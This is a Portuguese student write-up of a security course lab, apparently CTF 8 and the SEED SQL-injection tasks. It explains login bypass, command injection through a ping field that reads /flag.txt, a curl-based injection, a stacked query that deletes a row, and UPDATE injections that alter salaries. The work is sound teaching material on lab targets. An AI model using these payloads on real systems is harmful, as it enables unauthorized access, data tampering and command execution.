# CTF 8 #

**Desafio 1** 

Neste desafio, é nos pedido que façamos login no servidor web como admin. Para tal utilizamos um ataque do tipo _SQL INJECTION_ em que o utilizador, com o controlo do input, consegue colocar código malicioso em declarações SQL.

Analisando a forma como o servidor comunica com a base de dados, verificamos que a interrogação feita é a seguinte: 
``` sql
SELECT username FROM user WHERE username = '".$username."' AND password = '".$password."'
```
onde $username e $password são os parâmetros que escrevemos no input.

Escrevendo o seguinte no input de username : 
```SQL
' or 1=1--
```
A declaração SQL será a seguinte: 
```sql
SELECT username FROM user WHERE username = '' or 1=1  -- ' AND password = '".$password."'
```

Como `1 = 1` é sempre avaliado como `TRUE`, a declaração SQL acima irá retornar TODOS os usernames na tabela `user`.

O restante pedaço do input é usado para ignorar tudo o que à sua frente, uma vez que `--` delimita o inicio de um comentário em SQL. Deste modo, não intressa o input que colocamos em password, pois será ignorado pela base de dados.

**Desafio 2** 

Neste desafio, ao contrário do primeiro, não temos acesso ao código-fonte da aplicação web estando por isso perante uma análise black-box. Explorando a aplicação, verificamos que, mesmo sem login, um utilizador consegue dar `ping` a um host. Analisando a forma como esta funcionalidade está implementada, verificamos que ela usa o utilitário `ping` de Linux, e, dessa forma, é implementada desta forma: `ping <input do utilizador>`.

Ora, uma vez que o utilizador controla o input, estamos perante uma vulnerabilidade enorme uma vez qualquer utilizador na web pode executar comandos na consola, colocando o seguinte no input: `; <comando malicioso>`. Colocamos `;` para finalizar o comando atual `ping` e a seguir colocamos o nosso código que pretendemos executar. Obs: podiamos também fazer algo do tipo: `ctf-fsi.fe.up.pt; <comando malicioso>`.

Para obter a flag, basta colocar o seguinte no input: 
`; cat /flag.txt`. 


# Tarefas da semana 8#

**Task 1: Get Familiar with SQL Statements**

O principal objetivo desta tarefa é que os alunos se familiarizem com comandos `SQL` e que abram uma shell no container que contém a database MySQL.
É-nos também pedido para imprimir as informações sobre uma das pessoas presentes na base de dados, a Alice. Tal pode ser feito com o comando: 

```sql
select * from credential where name='Alice';
```
Este comando imprime todas as colunas presentes na tabela -> `*`, cuja linha corresponde à Alice -> `where name= 'Alice'`. `credential` é o nome dessa tabela

```sql
mysql> select * from credential where name='Alice';
```
| ID | Name  | EID   | Salary | birth | SSN      | PhoneNumber | Address | Email | NickName | Password                                 |
|----|-------|-------|--------|-------|----------|-------------|---------|-------|----------|------------------------------------------|
|  1 | Alice | 10000 |  20000 | 9/20  | 10211002 |             |         |       |          | fdbe918bdae83000aa54747fc95fe0470fff4976 |

**Task 2: SQL Injection Attack on SELECT Statement.**

Nesta tarefa, o nosso objetivo, como atacante, é conseguir fazer login na aplicação web. Ora, uma vez que não temos as crendencias necessárias, vamos recorrer a um ataque do tipo `SQL Injection`. 

**Task 2.1: SQL Injection Attack from webpage.**

Usando a interface da aplicação web, é-nos pedido que façamos login como administrador. Ora, as únicas informações que temos dele é que o seu username é `admin`. Deste modo, para conseguir obter as informações de todos os funcionários, é necessário fazermos o seguinte:

No campo dedicado ao username, colocamos o seguinte: `admin' #`  
Deste modo, a interrogação SQL será a seguinte: 
```sql
SELECT id, name, eid, salary, birth, ssn, address, email,
nickname, Password
FROM credential
WHERE name= 'admin' # and Password=' ';
```
E o resultado da interrogação são todas as tabelas relativas aos funcionários:
![Tabela 1](Week%208/task%202.1.png)

(`#` tem o mesmo efeito que `--`, sendo outro maneira de introduzir comentários em SQL)

No campo dedicado à password, não intressa o que colocamos visto que será ignorado por ser um comentário.

**Task 2.2: SQL Injection Attack from command line.**

Nesta tarefa é-nos pedido que façamos outra vez a tarefa anterior, desta vez usando o terminal, em vez da interface do website.
O comando que repete o processo observado acima é o seguinte:

`curl 'www.seed-server.com/unsafe_home.php?username=admin%27%20%23'`
- %27 -> Codificação HTML de `'` ;
- %20 -> Codificação HTML de ` ` ;
- %23 -> Codificação HTML de `#`;

Em baixo encontra-se um pequeno excerto do resultado do comando acima. A versão completa pode ser consultada [aqui](https://git.fe.up.pt/fsi/fsi2122/l04g02/-/blob/main/Week%208/task%202.2.html) 
```html
<thead class='thead-dark'>
    <tr>
        <th scope='col'>Username</th>
        <th scope='col'>EId</th>
        <th scope='col'>Salary</th>
        <th scope='col'>Birthday</th>
        <th scope='col'>SSN</th>
        <th scope='col'>Nickname</th>
        <th scope='col'>Email</th>
        <th scope='col'>Address</th>
        <th scope='col'>Ph. Number</th>
    </tr>
</thead>
    <tbody>
        <tr>
            <th scope='row'> Alice</th>
            <td>10000</td>
            <td>20000</td>
            <td>9/20</td>
            <td>10211002</td>
            <td></td>
            <td></td>
            <td></td>
            <td></td>
        </tr>
    ...
```
Ora, isto é nada mais do que o código html do que vimos quando fizemos o ataque pela interface web na tarefa anterior.


**Task 2.3: Append a new SQL statement.**

Nesta tarefa é-nos pedido para tentar introduzir dois comandos SQL na página de login. Isto pode ser alcançado com o uso de `;`, que separa os comandos SQL que pretendemos introduzir. Um exemplo seria o seguinte:

`'1=1; Delete from credential where name='Alice'; #`  

Contudo, verificamos que existem contramedidas de segurança ativas que impedem a realização de tal, pois é gerado o seguinte erro:

```
There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to user near '1=1; Delete from credential where name='Alice'; #` ...] 
```

A contramedida impede que façamos _append_ de vários comandos SQL, verificando se existe algum caratér do tipo `;` no que é enviado pelo utilizador. 


**Task 3: SQL Injection Attack on UPDATE Statement.**

**Task 3.1: Modify your own salary**

Nesta tarefa é-nos pedido que modifiquemos o nosso próprio salário (Alice). Para tal, podemos fazer o seguinte:
1. Fazer login como Alice utilizando o seguinte comando: `alice' #`
2. Verificar o salário da Alice antes de o alterar: 
![task 3.1 before](Week%208/task%203.1%20before.png) 
3. Editar o perfil da Alice, mais especificamente o seu nickname, colocando um dos seguintes comandos: 
- `', salary=50000 where SSN=10211002; #`  
- `', salary=50000 where name='alice'; #`

O primeiro input resulta no seguinte comando SQL: 
```sql
UPDATE credential SET
nickname = ' ', salary = '50000',
WHERE SNN=10211002; -- email='$input_email', address='$input_address', Password='$hashed_pwd', PhoneNumber='$input_phonenumber' WHERE ID=$id;
```
(`#`tem o mesmo efeito que `--`, apenas estamos a colocar `--` para ficar mais legível uma vez que o _markdown_ não assume `#` como sendo um comentário)

O segundo input resulta no seguinte comando SQL: 
```sql
UPDATE credential SET
nickname = ' ', salary = '50000',
WHERE name='Alice'; -- email='$input_email', address='$input_address', Password='$hashed_pwd', PhoneNumber='$input_phonenumber' WHERE ID=$id;
```

4. Verificar que a alteração foi bem sucedida:
![task 3.1 after](Week 8/task%203.1%20after.png)  


**Task 3.2: Modify other people’ salary.**
Utilizando o mesmo raciocínio da tarefa anterior, podemos facilmente alterar o salário de outro funcionário, sem precisarmos de estar na sua conta.
Para tal, podemos fazer o seguinte:
1. (Opcional) Fazer login como Boby usando o comando `boby' #` para verificar qual o seu salário atual:
![task 3.2 before](Week%208/task%203.2%20before.png) 
2. Fazer login na nossa conta (Alice) da mesma forma que o fizemos na tarefa acima: `alice' #`.
3. Editar o perfil da Alice, mais especificamente o seu nickname, colocando o seguinte comando: 
`', salary=1 where name='boby'; #`
Isto resulta no seguinte comando SQL:
```sql
UPDATE credential SET
nickname = ' ', salary = '1',
WHERE name='boby'; -- email='$input_email', address='$input_address', Password='$hashed_pwd', PhoneNumber='$input_phonenumber' WHERE ID=$id;
```
4. Verificar que a alteração foi bem sucedida:
![task 3.2 after](Week%208/task%203.2%20after.png)  
